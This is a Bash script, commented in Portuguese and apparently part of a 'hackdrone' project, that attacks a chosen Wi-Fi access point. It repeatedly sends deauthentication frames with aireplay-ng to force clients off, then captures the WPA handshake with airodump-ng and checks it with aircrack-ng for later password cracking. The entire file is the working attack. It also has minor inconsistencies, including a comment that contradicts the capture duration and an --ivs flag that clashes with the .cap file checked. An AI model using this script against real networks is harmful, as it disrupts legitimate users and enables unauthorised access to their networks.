#!/bin/bash

# Verifica se foram fornecidos argumentos suficientes
if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <interface> <bssid>"
    exit 1
fi

INTERFACE=$1
TARGET_BSSID=$2
OUTPUT_FILE="session/airodump_capture"
CAPTURE_DURATION=40   # Reduzido o tempo de captura para 20 segundos
DEAUTH_COUNT=5
SLEEP_INTERVAL=5

# Função para capturar pacotes EAPOL
capture_eapol() {
    local bssid=$1
    local ch=$2
    local output_file="hackdrone_${bssid}"
    echo "Iniciando captura no canal $ch para o BSSID $bssid por $CAPTURE_DURATION segundos..."
    sudo timeout "${CAPTURE_DURATION}s" airodump-ng --ivs -w "$output_file" -c "$ch" --bssid "$bssid" "$INTERFACE" --write-interval 1
    
    # Verifica se um pacote EAPOL foi capturado
    echo "Verificando pacotes EAPOL..."
    if sudo aircrack-ng -a2 -w /dev/null "${output_file}-01.cap" | grep -q "1 handshake"; then
        echo "Pacote EAPOL capturado com sucesso!"
        return 0
    else
        echo "Nenhum pacote EAPOL capturado ainda."
        return 1
    fi
}

# Função para desautenticar clientes do BSSID alvo
send_deauth() {
    local bssid=$1
    local ch=$2
    echo "Enviando pacotes de desautenticação para o BSSID $bssid no canal $ch..."
    sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$bssid" --ignore-negative-one "$INTERFACE"
}

# Verifica se a interface está em modo monitor
monitor_mode=$(iwconfig "$INTERFACE" 2>&1 | grep 'Mode:Monitor')
if [[ ! $monitor_mode ]]; then
    echo "Erro: A interface $INTERFACE não está em modo monitor."
    exit 1
fi

# Extrai BSSIDs e canais do arquivo CSV
bssids_chs=$(awk -F, '/Station/{flag=0} /BSSID/{flag=1; next} flag {print $1, $4}' "${OUTPUT_FILE}-01.csv")

# Itera sobre a lista de BSSIDs e canais
echo "$bssids_chs" | while read -r bssid ch; do
    if [ "$bssid" == "$TARGET_BSSID" ]; then
        echo "BSSID $bssid encontrado no canal $ch."

        while true; do
            # Envia pacotes de desautenticação para forçar a reautenticação dos clientes
            send_deauth "$bssid" "$ch"

            # Captura pacotes EAPOL no canal correto
            capture_eapol "$bssid" "$ch"
            eapol_captured=$?

            if [ $eapol_captured -eq 0 ]; then
                echo "Captura de pacotes EAPOL concluída para o BSSID $bssid."
                rm -f "${output_file}-01.csv"  # Remove arquivos intermediários para liberar espaço
                break
            else
                echo "Nenhum pacote EAPOL capturado. Tentando novamente..."
                sleep "$SLEEP_INTERVAL"  # Pausa para dar tempo aos clientes se reautenticarem
            fi
        done
        break
    fi
done
